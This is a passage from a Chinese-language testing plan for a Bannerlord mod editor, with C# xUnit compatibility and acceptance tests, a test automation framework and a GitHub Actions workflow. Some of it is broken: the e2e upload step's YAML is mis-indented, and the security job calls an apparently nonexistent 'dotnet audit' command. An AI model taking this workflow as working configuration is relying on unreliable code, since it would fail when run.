            // Act
            var result = await loader.LoadDynamicAsync(testFile);
            var serialized = XmlTestUtils.Serialize(result);
            
            // Assert
            Assert.NotNull(result);
            Assert.False(string.IsNullOrEmpty(serialized));
            
            // 验证路径处理
            var normalizedPath = NormalizePath(testFile);
            Assert.True(Path.IsPathFullyQualified(normalizedPath));
            
            // 验证文件编码
            var fileContent = await File.ReadAllTextAsync(testFile);
            Assert.True(IsValidUtf8(fileContent));
        }
        finally
        {
            CleanupTempFile();
        }
    }
    
    [Theory]
    [InlineData("UTF-8")]
    [InlineData("UTF-16")]
    [InlineData("UTF-32")]
    [InlineData("ISO-8859-1")]
    public async Task XmlProcessing_ShouldHandleDifferentEncodings(string encodingName)
    {
        // Arrange
        var encoding = Encoding.GetEncoding(encodingName);
        var testXml = "<root><item>测试内容</item></root>";
        var testFile = CreateTempFileWithEncoding(testXml, encoding);
        var loader = new GenericXmlLoader<DynamicType>();
        
        try
        {
            // Act
            var result = await loader.LoadDynamicAsync(testFile);
            
            // Assert
            Assert.NotNull(result);
            
            // 验证编码正确处理
            var serialized = XmlTestUtils.Serialize(result);
            Assert.Contains("测试内容", serialized);
        }
        finally
        {
            CleanupTempFile();
        }
    }
    
    [Fact]
    public async Task PathHandling_ShouldWorkConsistentlyAcrossPlatforms()
    {
        // Arrange
        var testPaths = new[]
        {
            "relative/path/file.xml",
            "another\\relative\\path\\file.xml",
            "/absolute/path/file.xml",
            "C:\\absolute\\path\\file.xml"
        };
        
        var fileDiscoveryService = new FileDiscoveryService(Directory.GetCurrentDirectory());
        
        // Act & Assert
        foreach (var testPath in testPaths)
        {
            var normalizedPath = fileDiscoveryService.NormalizePath(testPath);
            Assert.NotNull(normalizedPath);
            
            // 验证路径分隔符一致性
            Assert.DoesNotContain("\\", normalizedPath);
            Assert.Contains("/", normalizedPath);
        }
    }
}
```

### 6.2 XML版本兼容性测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Compatibility/XmlVersionCompatibilityTests.cs
public class XmlVersionCompatibilityTests
{
    [Theory]
    [InlineData("1.0")]
    [InlineData("1.1")]
    public async Task XmlProcessing_ShouldHandleDifferentXmlVersions(string xmlVersion)
    {
        // Arrange
        var xmlContent = $@"<?xml version=""{xmlVersion}"" encoding=""UTF-8""?>
                           <root>
                               <item id=""1"">test</item>
                           </root>";
        
        var testFile = CreateTempFile(xmlContent);
        var loader = new GenericXmlLoader<DynamicType>();
        
        try
        {
            // Act
            var result = await loader.LoadDynamicAsync(testFile);
            
            // Assert
            Assert.NotNull(result);
            
            // 验证XML版本声明保持不变
            var serialized = XmlTestUtils.Serialize(result, xmlContent);
            Assert.Contains($"version=\"{xmlVersion}\"", serialized);
        }
        finally
        {
            CleanupTempFile();
        }
    }
    
    [Theory]
    [InlineData("action_types_v1.xml")]
    [InlineData("action_types_v2.xml")]
    [InlineData("action_types_v3.xml")]
    public async Task XmlModels_ShouldHandleVersionDifferences(string versionedFileName)
    {
        // Arrange
        var testDataPath = GetTestDataPath();
        var versionedFilePath = Path.Combine(testDataPath, "VersionedXml", versionedFileName);
        
        if (!File.Exists(versionedFilePath))
        {
            // 跳过测试如果版本化文件不存在
            return;
        }
        
        var loader = new GenericXmlLoader<ActionTypesDO>();
        
        try
        {
            // Act
            var result = await loader.LoadAsync(versionedFilePath);
            
            // Assert
            Assert.NotNull(result);
            
            // 验证基本结构
            Assert.NotNull(result.Actions);
            
            // 版本特定的验证
            var version = ExtractVersionFromFileName(versionedFileName);
            ValidateVersionSpecificFeatures(result, version);
        }
        finally
        {
            // 清理由测试创建的任何临时文件
        }
    }
}
```

## 7. 用户验收测试

### 7.1 功能验收测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/UAT/FunctionalAcceptanceTests.cs
public class FunctionalAcceptanceTests
{
    [Theory]
    [InlineData("action_types", "basic_editing")]
    [InlineData("combat_parameters", "complex_editing")]
    [InlineData("skeletons_layout", "layout_editing")]
    [InlineData("particle_systems", "system_editing")]
    public async Task UserStory_ShouldBeImplementedCorrectly(string xmlType, string editingScenario)
    {
        // Arrange
        var userStory = await LoadUserStoryAsync(xmlType, editingScenario);
        var testEnvironment = await SetupTestEnvironmentForUserStory(userStory);
        
        try
        {
            // Act
            var acceptanceResult = await userStory.ExecuteAcceptanceTestAsync(testEnvironment);
            
            // Assert
            Assert.True(acceptanceResult.Success, 
                $"User story '{userStory.Title}' should pass acceptance tests");
            
            Assert.True(acceptanceResult.MeetsAcceptanceCriteria, 
                "All acceptance criteria should be met");
            
            Assert.True(acceptanceResult.UserExperience >= userStory.MinimumUserExperience, 
                $"User experience should be at least {userStory.MinimumUserExperience}");
            
            // 记录验收测试结果
            LogAcceptanceTestResult(userStory, acceptanceResult);
        }
        finally
        {
            await testEnvironment.CleanupAsync();
        }
    }
    
    [Fact]
    public async Task CompleteModCreationWorkflow_ShouldWorkEndToEnd()
    {
        // Arrange
        var modCreationWorkflow = new ModCreationWorkflow
        {
            ModName = "Test Combat Mod",
            TargetXmlFiles = new[] { "combat_parameters.xml", "action_types.xml" },
            Modifications = new[]
            {
                new Modification { Type = "balance_change", Target = "combat_parameter", Value = "1.2" },
                new Modification { Type = "new_action", Target = "action_type", Value = "special_attack" }
            }
        };
        
        var testEnvironment = await SetupModCreationTestEnvironment();
        
        try
        {
            // Act
            var workflowResult = await modCreationWorkflow.ExecuteAsync(testEnvironment);
            
            // Assert
            Assert.True(workflowResult.Success, "Mod creation workflow should succeed");
            
            // 验证所有修改都被应用
            Assert.All(workflowResult.AppliedModifications, m => Assert.True(m.Success));
            
            // 验证生成的mod文件
            Assert.NotNull(workflowResult.GeneratedModPackage);
            Assert.True(File.Exists(workflowResult.GeneratedModPackage.Path));
            
            // 验证mod包结构
            var modPackage = new ModPackage(workflowResult.GeneratedModPackage.Path);
            Assert.True(modPackage.IsValid);
            Assert.True(modPackage.ContainsRequiredFiles);
            
            // 验证mod可以在测试环境中加载
            var loadResult = await testEnvironment.ModLoader.LoadModAsync(modPackage);
            Assert.True(loadResult.Success);
            
            // 验证mod功能
            var functionalityResult = await testEnvironment.ModTester.TestModFunctionalityAsync(modPackage);
            Assert.True(functionalityResult.AllTestsPassed);
        }
        finally
        {
            await testEnvironment.CleanupAsync();
        }
    }
}
```

### 7.2 用户体验测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/UAT/UserExperienceTests.cs
public class UserExperienceTests
{
    [Theory]
    [InlineData("beginner")]
    [InlineData("intermediate")]
    [InlineData("expert")]
    public async Task UserInterface_ShouldBeIntuitiveForAllSkillLevels(string skillLevel)
    {
        // Arrange
        var userSession = CreateUserSession(skillLevel);
        var testTasks = GetTasksForSkillLevel(skillLevel);
        
        try
        {
            // Act
            var sessionResult = await userSession.ExecuteTasksAsync(testTasks);
            
            // Assert
            Assert.True(sessionResult.SuccessRate >= 0.8, 
                $"Users with {skillLevel} skill level should complete at least 80% of tasks");
            
            Assert.True(sessionResult.AverageTaskCompletionTime <= GetMaxExpectedTime(skillLevel), 
                $"Task completion time should be reasonable for {skillLevel} users");
            
            Assert.True(sessionResult.UserSatisfaction >= GetMinSatisfactionLevel(skillLevel), 
                $"User satisfaction should be acceptable for {skillLevel} users");
            
            // 分析用户行为模式
            var behaviorAnalysis = AnalyzeUserBehavior(sessionResult);
            Assert.True(behaviorAnalysis.EfficiencyScore >= 0.7, 
                "User efficiency should be good");
            
            Assert.True(behaviorAnalysis.ErrorRate <= 0.2, 
                "Error rate should be low");
            
            // 记录用户体验指标
            LogUserExperienceMetrics(skillLevel, sessionResult, behaviorAnalysis);
        }
        finally
        {
            await userSession.CleanupAsync();
        }
    }
    
    [Fact]
    public async Task Performance_ShouldMeetUserExpectations()
    {
        // Arrange
        var performanceTestScenarios = new[]
        {
            new PerformanceTestScenario
            {
                Name = "Large XML Loading",
                Action = async () => await LoadLargeXmlFileAsync(),
                MaxExpectedTimeMs = 3000,
                UserExpectation = "Large files should load quickly"
            },
            new PerformanceTestScenario
            {
                Name = "Real-time Validation",
                Action = async () => await PerformRealTimeValidationAsync(),
                MaxExpectedTimeMs = 500,
                UserExpectation = "Validation should be instant"
            },
            new PerformanceTestScenario
            {
                Name = "Batch Processing",
                Action = async () => await ProcessBatchOfFilesAsync(),
                MaxExpectedTimeMs = 10000,
                UserExpectation = "Batch processing should be efficient"
            }
        };
        
        var userExperienceTester = new UserExperienceTester();
        
        try
        {
            // Act
            var performanceResults = new List<PerformanceTestResult>();
            
            foreach (var scenario in performanceTestScenarios)
            {
                var result = await userExperienceTester.TestPerformanceAsync(scenario);
                performanceResults.Add(result);
            }
            
            // Assert
            Assert.All(performanceResults, result => 
            {
                Assert.True(result.ActualTimeMs <= result.MaxExpectedTimeMs,
                    $"{result.Name} should complete within {result.MaxExpectedTimeMs}ms");
                
                Assert.True(result.UserSatisfaction >= 0.7,
                    $"User satisfaction for {result.Name} should be good");
            });
            
            // 生成性能用户体验报告
            var performanceReport = GeneratePerformanceUserExperienceReport(performanceResults);
            Assert.True(performanceReport.OverallUserSatisfaction >= 0.8,
                "Overall performance user satisfaction should be good");
        }
        finally
        {
            await userExperienceTester.CleanupAsync();
        }
    }
}
```

## 8. 测试自动化和CI/CD集成

### 8.1 测试自动化框架

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Automation/TestAutomationFramework.cs
public class TestAutomationFramework
{
    private readonly ITestRunner _testRunner;
    private readonly ITestReporter _testReporter;
    private readonly ITestDataManager _testDataManager;
    private readonly IConfiguration _configuration;
    
    public TestAutomationFramework(
        ITestRunner testRunner,
        ITestReporter testReporter,
        ITestDataManager testDataManager,
        IConfiguration configuration)
    {
        _testRunner = testRunner;
        _testReporter = testReporter;
        _testDataManager = testDataManager;
        _configuration = configuration;
    }
    
    public async Task<AutomationResult> RunFullTestSuiteAsync()
    {
        var stopwatch = Stopwatch.StartNew();
        var results = new List<TestSuiteResult>();
        
        try
        {
            // 1. 准备测试环境
            await PrepareTestEnvironmentAsync();
            
            // 2. 运行单元测试
            var unitTestResult = await RunUnitTestSuiteAsync();
            results.Add(unitTestResult);
            
            // 3. 运行集成测试
            var integrationTestResult = await RunIntegrationTestSuiteAsync();
            results.Add(integrationTestResult);
            
            // 4. 运行端到端测试
            var e2eTestResult = await RunE2ETestSuiteAsync();
            results.Add(e2eTestResult);
            
            // 5. 运行性能测试
            var performanceTestResult = await RunPerformanceTestSuiteAsync();
            results.Add(performanceTestResult);
            
            // 6. 运行安全测试
            var securityTestResult = await RunSecurityTestSuiteAsync();
            results.Add(securityTestResult);
            
            stopwatch.Stop();
            
            // 生成综合报告
            var automationResult = new AutomationResult
            {
                TotalTimeMs = stopwatch.ElapsedMilliseconds,
                TestSuiteResults = results,
                OverallSuccess = results.All(r => r.Success),
                CoveragePercentage = CalculateOverallCoverage(results),
                TestExecutionSummary = GenerateExecutionSummary(results)
            };
            
            // 生成报告
            await GenerateAutomationReportAsync(automationResult);
            
            return automationResult;
        }
        catch (Exception ex)
        {
            stopwatch.Stop();
            
            return new AutomationResult
            {
                TotalTimeMs = stopwatch.ElapsedMilliseconds,
                TestSuiteResults = results,
                OverallSuccess = false,
                Error = ex.Message,
                TestExecutionSummary = $"Test automation failed: {ex.Message}"
            };
        }
        finally
        {
            await CleanupTestEnvironmentAsync();
        }
    }
    
    private async Task<TestSuiteResult> RunUnitTestSuiteAsync()
    {
        var testAssembly = _configuration["TestAssemblies:UnitTests"];
        var testFilter = _configuration["TestFilters:UnitTests"];
        
        var result = await _testRunner.RunTestsAsync(testAssembly, testFilter);
        
        return new TestSuiteResult
        {
            SuiteName = "Unit Tests",
            Success = result.Success,
            TotalTests = result.TotalTests,
            PassedTests = result.PassedTests,
            FailedTests = result.FailedTests,
            SkippedTests = result.SkippedTests,
            ExecutionTimeMs = result.ExecutionTimeMs,
            CoveragePercentage = result.CoveragePercentage,
            TestResults = result.TestResults
        };
    }
    
    private async Task<TestSuiteResult> RunIntegrationTestSuiteAsync()
    {
        var testAssembly = _configuration["TestAssemblies:IntegrationTests"];
        var testFilter = _configuration["TestFilters:IntegrationTests"];
        
        // 设置集成测试环境
        await SetupIntegrationTestEnvironmentAsync();
        
        var result = await _testRunner.RunTestsAsync(testAssembly, testFilter);
        
        return new TestSuiteResult
        {
            SuiteName = "Integration Tests",
            Success = result.Success,
            TotalTests = result.TotalTests,
            PassedTests = result.PassedTests,
            FailedTests = result.FailedTests,
            SkippedTests = result.SkippedTests,
            ExecutionTimeMs = result.ExecutionTimeMs,
            CoveragePercentage = result.CoveragePercentage,
            TestResults = result.TestResults
        };
    }
    
    private async Task<TestSuiteResult> RunE2ETestSuiteAsync()
    {
        var testAssembly = _configuration["TestAssemblies:E2ETests"];
        var testFilter = _configuration["TestFilters:E2ETests"];
        
        // 设置E2E测试环境
        await SetupE2ETestEnvironmentAsync();
        
        var result = await _testRunner.RunTestsAsync(testAssembly, testFilter);
        
        return new TestSuiteResult
        {
            SuiteName = "E2E Tests",
            Success = result.Success,
            TotalTests = result.TotalTests,
            PassedTests = result.PassedTests,
            FailedTests = result.FailedTests,
            SkippedTests = result.SkippedTests,
            ExecutionTimeMs = result.ExecutionTimeMs,
            CoveragePercentage = result.CoveragePercentage,
            TestResults = result.TestResults
        };
    }
    
    private async Task<TestSuiteResult> RunPerformanceTestSuiteAsync()
    {
        var testAssembly = _configuration["TestAssemblies:PerformanceTests"];
        var testFilter = _configuration["TestFilters:PerformanceTests"];
        
        // 设置性能测试环境
        await SetupPerformanceTestEnvironmentAsync();
        
        var result = await _testRunner.RunTestsAsync(testAssembly, testFilter);
        
        return new TestSuiteResult
        {
            SuiteName = "Performance Tests",
            Success = result.Success,
            TotalTests = result.TotalTests,
            PassedTests = result.PassedTests,
            FailedTests = result.FailedTests,
            SkippedTests = result.SkippedTests,
            ExecutionTimeMs = result.ExecutionTimeMs,
            CoveragePercentage = result.CoveragePercentage,
            TestResults = result.TestResults
        };
    }
    
    private async Task<TestSuiteResult> RunSecurityTestSuiteAsync()
    {
        var testAssembly = _configuration["TestAssemblies:SecurityTests"];
        var testFilter = _configuration["TestFilters:SecurityTests"];
        
        // 设置安全测试环境
        await SetupSecurityTestEnvironmentAsync();
        
        var result = await _testRunner.RunTestsAsync(testAssembly, testFilter);
        
        return new TestSuiteResult
        {
            SuiteName = "Security Tests",
            Success = result.Success,
            TotalTests = result.TotalTests,
            PassedTests = result.PassedTests,
            FailedTests = result.FailedTests,
            SkippedTests = result.SkippedTests,
            ExecutionTimeMs = result.ExecutionTimeMs,
            CoveragePercentage = result.CoveragePercentage,
            TestResults = result.TestResults
        };
    }
    
    private async Task GenerateAutomationReportAsync(AutomationResult result)
    {
        var report = new TestAutomationReport
        {
            GeneratedAt = DateTime.UtcNow,
            OverallResult = result,
            CoverageAnalysis = AnalyzeCoverage(result),
            PerformanceAnalysis = AnalyzePerformance(result),
            QualityMetrics = CalculateQualityMetrics(result),
            Recommendations = GenerateRecommendations(result)
        };
        
        await _testReporter.GenerateReportAsync(report);
        
        // 如果测试失败，发送通知
        if (!result.OverallSuccess)
        {
            await SendFailureNotificationAsync(report);
        }
    }
}
```

### 8.2 CI/CD配置

```yaml
# CI/CD配置文件路径: .github/workflows/test-automation.yml
name: Test Automation Pipeline

on:
  push:
    branches: [ main, develop, feature/* ]
  pull_request:
    branches: [ main, develop ]
  schedule:
    - cron: '0 2 * * *'  # 每天凌晨2点运行

env:
  DOTNET_VERSION: '9.0.x'
  TEST_DATA_PATH: './BannerlordModEditor.Common.Tests/TestData'
  COVERAGE_THRESHOLD: '95'
  PERFORMANCE_THRESHOLD: '5000'

jobs:
  unit-tests:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        dotnet-version: ['9.0.x']
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup .NET
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: ${{ env.DOTNET_VERSION }}
    
    - name: Restore dependencies
      run: dotnet restore
    
    - name: Build solution
      run: dotnet build --configuration Release --no-restore
    
    - name: Run unit tests with coverage
      run: |
        dotnet test BannerlordModEditor.Common.Tests \
          --configuration Release \
          --collect:"XPlat Code Coverage" \
          --results-directory TestResults \
          --logger "trx;LogFileName=unit_tests.trx" \
          --verbosity normal
    
    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v3
      with:
        file: ./TestResults/coverage.xml
        flags: unittests
        name: codecov-umbrella
    
    - name: Upload test results
      uses: actions/upload-artifact@v3
      with:
        name: unit-test-results-${{ matrix.os }}
        path: TestResults/

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup .NET
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: ${{ env.DOTNET_VERSION }}
    
    - name: Restore dependencies
      run: dotnet restore
    
    - name: Build solution
      run: dotnet build --configuration Release --no-restore
    
    - name: Run integration tests
      run: |
        dotnet test BannerlordModEditor.Common.Tests \
          --configuration Release \
          --filter "TestCategory=Integration" \
          --logger "trx;LogFileName=integration_tests.trx" \
          --verbosity normal
    
    - name: Upload test results
      uses: actions/upload-artifact@v3
      with:
        name: integration-test-results
        path: TestResults/

  performance-tests:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests]
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup .NET
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: ${{ env.DOTNET_VERSION }}
    
    - name: Restore dependencies
      run: dotnet restore
    
    - name: Build solution
      run: dotnet build --configuration Release --no-restore
    
    - name: Run performance tests
      run: |
        dotnet test BannerlordModEditor.Common.Tests \
          --configuration Release \
          --filter "TestCategory=Performance" \
          --logger "trx;LogFileName=performance_tests.trx" \
          --verbosity normal
    
    - name: Generate performance report
      run: |
        dotnet run --project TestReporter -- \
          --input TestResults/performance_tests.trx \
          --output TestResults/performance_report.html
    
    - name: Upload performance report
      uses: actions/upload-artifact@v3
      with:
        name: performance-test-results
        path: |
          TestResults/
          performance_report.html

  security-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup .NET
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: ${{ env.DOTNET_VERSION }}
    
    - name: Restore dependencies
      run: dotnet restore
    
    - name: Build solution
      run: dotnet build --configuration Release --no-restore
    
    - name: Run security tests
      run: |
        dotnet test BannerlordModEditor.Common.Tests \
          --configuration Release \
          --filter "TestCategory=Security" \
          --logger "trx;LogFileName=security_tests.trx" \
          --verbosity normal
    
    - name: Run security scan
      run: |
        dotnet list package --vulnerable --include-transitive
        dotnet audit
    
    - name: Upload security results
      uses: actions/upload-artifact@v3
      with:
        name: security-test-results
        path: TestResults/

  e2e-tests:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests]
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup .NET
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: ${{ env.DOTNET_VERSION }}
    
    - name: Restore dependencies
      run: dotnet restore
    
    - name: Build solution
      run: dotnet build --configuration Release --no-restore
    
    - name: Run E2E tests
      run: |
        dotnet test BannerlordModEditor.Common.Tests \
          --configuration Release \
          --filter "TestCategory=E2E" \
          --logger "trx;LogFileName=e2e_tests.trx" \
          --verbosity normal
    
    - name: Upload E2E results
      uses: actions/upload-artifact@v3
        with:
          name: e2e-test-results
          path: TestResults/

  quality-gate:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests, performance-tests, security-tests, e2e-tests]
    
    steps:
    - name: Download all test results
      uses: actions/download-artifact@v3
    
    - name: Check coverage threshold
      run: |
        COVERAGE=$(cat unit-test-results/coverage.xml | grep -o 'line-rate="[0-9.]*"' | cut -d'"' -f2)
        COVERAGE_PERCENTAGE=$(echo "$COVERAGE * 100" | bc)
        
        if (( $(echo "$COVERAGE_PERCENTAGE < ${{ env.COVERAGE_THRESHOLD }}" | bc -l) )); then
          echo "Coverage $COVERAGE_PERCENTAGE% is below threshold ${{ env.COVERAGE_THRESHOLD }}%"
          exit 1
        fi
        
        echo "Coverage $COVERAGE_PERCENTAGE% meets threshold"
    
    - name: Generate combined test report
      run: |
        dotnet run --project TestReporter -- \
          --unit-results unit-test-results/ \
          --integration-results integration-test-results/ \
          --performance-results performance-test-results/ \
          --security-results security-test-results/ \
          --e2e-results e2e-test-results/ \
          --output combined-test-report.html
    
    - name: Upload combined report
      uses: actions/upload-artifact@v3
      with:
        name: combined-test-report
        path: combined-test-report.html
    
    - name: Comment PR with test results
      if: github.event_name == 'pull_request'
      uses: actions/github-script@v6
      with:
        script: |
          const fs = require('fs');
          const report = fs.readFileSync('combined-test-report.html', 'utf8');
          
          github.rest.issues.createComment({
            issue_number: context.issue.number,
            owner: context.repo.owner,
            repo: context.repo.repo,
            body: `## Test Results 🧪\n\n${report}`
          });
```

## 9. 测试执行计划和质量评估报告

### 9.1 测试执行计划

```csharp
// 测试执行计划文件路径: docs/testing/TestExecutionPlan.cs
public class TestExecutionPlan
{
    public DateTime StartDate { get; set; }
    public DateTime EndDate { get; set; }
    public List<TestPhase> Phases { get; set; }
    public TestEnvironment Environment { get; set; }
    public TestQualityCriteria QualityCriteria { get; set; }
    public TestReporting Reporting { get; set; }
    
    public TestExecutionPlan()
    {
        StartDate = DateTime.UtcNow;
        EndDate = StartDate.AddDays(14); // 2周执行周期
        Phases = new List<TestPhase>();
        Environment = new TestEnvironment();
        QualityCriteria = new TestQualityCriteria();
        Reporting = new TestReporting();
        
        InitializeTestPhases();
    }
    
    private void InitializeTestPhases()
    {
        // 第一阶段：单元测试 (3天)
        Phases.Add(new TestPhase
        {
            Name = "Unit Testing Phase",
            Duration = TimeSpan.FromDays(3),
            Priority = TestPriority.High,
            TestTypes = new[] { TestType.Unit },
            SuccessCriteria = new TestSuccessCriteria
            {
                MinimumCoverage = 95,
                MaximumFailureRate = 0.02,
                PerformanceThreshold = 1000 // ms
            },
            Dependencies = new string[0]
        });
        
        // 第二阶段：集成测试 (2天)
        Phases.Add(new TestPhase
        {
            Name = "Integration Testing Phase",
            Duration = TimeSpan.FromDays(2),
            Priority = TestPriority.High,
            TestTypes = new[] { TestType.Integration },
            SuccessCriteria = new TestSuccessCriteria
            {
                MinimumCoverage = 90,
                MaximumFailureRate = 0.05,
                PerformanceThreshold = 3000 // ms
            },
            Dependencies = new[] { "Unit Testing Phase" }
        });
        
        // 第三阶段：端到端测试 (2天)
        Phases.Add(new TestPhase
        {
            Name = "E2E Testing Phase",
            Duration = TimeSpan.FromDays(2),
            Priority = TestPriority.Medium,
            TestTypes = new[] { TestType.E2E },
            SuccessCriteria = new TestSuccessCriteria
            {
                MinimumCoverage = 85,
                MaximumFailureRate = 0.10,
                PerformanceThreshold = 5000 // ms
            },
            Dependencies = new[] { "Integration Testing Phase" }
        });
        
        // 第四阶段：性能测试 (2天)
        Phases.Add(new TestPhase
        {
            Name = "Performance Testing Phase",
            Duration = TimeSpan.FromDays(2),
            Priority = TestPriority.Medium,
            TestTypes = new[] { TestType.Performance },
            SuccessCriteria = new TestSuccessCriteria
            {
                MinimumCoverage = 80,
                MaximumFailureRate = 0.15,
                PerformanceThreshold = 10000 // ms
            },
            Dependencies = new[] { "E2E Testing Phase" }
        });
        
        // 第五阶段：安全测试 (2天)
        Phases.Add(new TestPhase
        {
            Name = "Security Testing Phase",
            Duration = TimeSpan.FromDays(2),
            Priority = TestPriority.High,
            TestTypes = new[] { TestType.Security },
            SuccessCriteria = new TestSuccessCriteria
            {
                MinimumCoverage = 90,
                MaximumFailureRate = 0.01,
                PerformanceThreshold = 2000 // ms
            },
            Dependencies = new[] { "Unit Testing Phase" }
        });
        
        // 第六阶段：兼容性测试 (1天)
        Phases.Add(new TestPhase
        {
            Name = "Compatibility Testing Phase",
            Duration = TimeSpan.FromDays(1),
            Priority = TestPriority.Medium,
            TestTypes = new[] { TestType.Compatibility },
            SuccessCriteria = new TestSuccessCriteria
            {
                MinimumCoverage = 85,
                MaximumFailureRate = 0.10,
                PerformanceThreshold = 5000 // ms
            },
            Dependencies = new[] { "Integration Testing Phase" }
        });
        
        // 第七阶段：用户验收测试 (2天)
        Phases.Add(new TestPhase
        {
            Name = "User Acceptance Testing Phase",
            Duration = TimeSpan.FromDays(2),
            Priority = TestPriority.High,
            TestTypes = new[] { TestType.UAT },
            SuccessCriteria = new TestSuccessCriteria
            {
                MinimumCoverage = 80,
                MaximumFailureRate = 0.15,
                PerformanceThreshold = 8000 // ms
            },
            Dependencies = new[] { "E2E Testing Phase", "Performance Testing Phase" }
        });
    }
    
    public async Task<TestExecutionResult> ExecuteAsync()
    {
        var executionResult = new TestExecutionResult
        {
            StartedAt = DateTime.UtcNow,
            PhaseResults = new List<TestPhaseResult>()
        };
        
        try
        {
            // 准备测试环境
            await Environment.PrepareAsync();
            
            // 按顺序执行各个测试阶段
            foreach (var phase in Phases.OrderBy(p => p.Priority))
            {
                // 检查依赖关系
                if (!await CheckDependenciesAsync(phase, executionResult))
                {
                    executionResult.PhaseResults.Add(new TestPhaseResult
                    {
                        PhaseName = phase.Name,
                        Success = false,
                        Skipped = true,
                        Reason = "Dependencies not met"
                    });
                    continue;
                }
                
                // 执行测试阶段
                var phaseResult = await ExecutePhaseAsync(phase);
                executionResult.PhaseResults.Add(phaseResult);
                
                // 检查阶段是否通过
                if (!phaseResult.Success && phase.Priority == TestPriority.High)
                {
                    executionResult.FailedAt = phase.Name;
                    executionResult.Success = false;
                    break;
                }
            }
            
            executionResult.FinishedAt = DateTime.UtcNow;
            executionResult.Success = executionResult.PhaseResults.All(r => r.Success || r.Skipped);
            
            // 生成质量评估报告
            executionResult.QualityAssessment = await GenerateQualityAssessmentAsync(executionResult);
            
            return executionResult;
        }
        catch (Exception ex)
        {
            executionResult.FinishedAt = DateTime.UtcNow;
            executionResult.Success = false;
            executionResult.Error = ex.Message;
            
            return executionResult;
        }
        finally
        {
            await Environment.CleanupAsync();
        }
    }
    
    private async Task<bool> CheckDependenciesAsync(TestPhase phase, TestExecutionResult executionResult)
    {
        if (phase.Dependencies == null || phase.Dependencies.Length == 0)
        {
            return true;
        }
        
        foreach (var dependency in phase.Dependencies)
        {
            var dependencyResult = executionResult.PhaseResults.FirstOrDefault(r => r.PhaseName == dependency);
            if (dependencyResult == null || !dependencyResult.Success)
            {
                return false;
            }
        }
        
        return true;
    }
    
    private async Task<TestPhaseResult> ExecutePhaseAsync(TestPhase phase)
    {
        var phaseResult = new TestPhaseResult
        {
            PhaseName = phase.Name,
            StartedAt = DateTime.UtcNow
        };
        
        try
        {
            var testRunner = CreateTestRunnerForPhase(phase);
            var testResults = new List<TestCaseResult>();
            
            // 获取测试用例
            var testCases = await GetTestCasesForPhaseAsync(phase);
            
            // 执行测试
            foreach (var testCase in testCases)
            {
                var result = await testRunner.RunTestAsync(testCase);
                testResults.Add(result);
            }
            
            phaseResult.FinishedAt = DateTime.UtcNow;
            phaseResult.TestResults = testResults;
            phaseResult.TotalTests = testResults.Count;
            phaseResult.PassedTests = testResults.Count(r => r.Status == TestStatus.Passed);
            phaseResult.FailedTests = testResults.Count(r => r.Status == TestStatus.Failed);
            phaseResult.SkippedTests = testResults.Count(r => r.Status == TestStatus.Skipped);
            phaseResult.Duration = phaseResult.FinishedAt - phaseResult.StartedAt;
            
            // 计算覆盖率
            phaseResult.CoveragePercentage = CalculateCoverage(testResults);
            
            // 检查成功标准
            phaseResult.Success = CheckSuccessCriteria(phase, phaseResult);
            
            // 生成阶段报告
            phaseResult.Report = await GeneratePhaseReportAsync(phase, phaseResult);
            
            return phaseResult;
        }
        catch (Exception ex)
        {
            phaseResult.FinishedAt = DateTime.UtcNow;
            phaseResult.Success = false;
            phaseResult.Error = ex.Message;
            
            return phaseResult;
        }
    }
    
    private bool CheckSuccessCriteria(TestPhase phase, TestPhaseResult phaseResult)
    {
        var criteria = phase.SuccessCriteria;
        
        // 检查覆盖率
        if (phaseResult.CoveragePercentage < criteria.MinimumCoverage)
        {
            return false;
        }
        
        // 检查失败率
        var failureRate = (double)phaseResult.FailedTests / phaseResult.TotalTests;
        if (failureRate > criteria.MaximumFailureRate)
        {
            return false;
        }
        
        // 检查性能阈值
        var averageExecutionTime = phaseResult.TestResults
            .Where(r => r.Status == TestStatus.Passed)
            .Average(r => r.ExecutionTimeMs);
        
        if (averageExecutionTime > criteria.PerformanceThreshold)
        {
            return false;
        }
        
        return true;
    }
    
    private async Task<QualityAssessment> GenerateQualityAssessmentAsync(TestExecutionResult executionResult)
    {
        var assessment = new QualityAssessment
        {
            GeneratedAt = DateTime.UtcNow,
            OverallScore = CalculateOverallQualityScore(executionResult),
            PhaseScores = executionResult.PhaseResults
                .Where(r => !r.Skipped)
                .ToDictionary(r => r.PhaseName, r => CalculatePhaseQualityScore(r)),
            Recommendations = GenerateQualityRecommendations(executionResult),
            RiskAssessment = AssessRisks(executionResult),
            ComplianceStatus = CheckCompliance(executionResult)
        };
        
        return assessment;
    }
}
```

### 9.2 质量评估报告

```csharp
// 质量评估报告文件路径: docs/testing/QualityAssessmentReport.cs
public class QualityAssessmentReport
{
    public async Task<QualityReport> GenerateQualityReportAsync(TestExecutionResult executionResult)
    {
        var report = new QualityReport
        {
            GeneratedAt = DateTime.UtcNow,
            ExecutionSummary = GenerateExecutionSummary(executionResult),
            QualityMetrics = CalculateQualityMetrics(executionResult),
            CoverageAnalysis = AnalyzeCoverage(executionResult),
            PerformanceAnalysis = AnalyzePerformance(executionResult),
            SecurityAssessment = AssessSecurity(executionResult),
            ComplianceReport = GenerateComplianceReport(executionResult),
            Recommendations = GenerateRecommendations(executionResult),
            RiskAssessment = AssessRisks(executionResult)
        };
        
        // 生成可视化报告
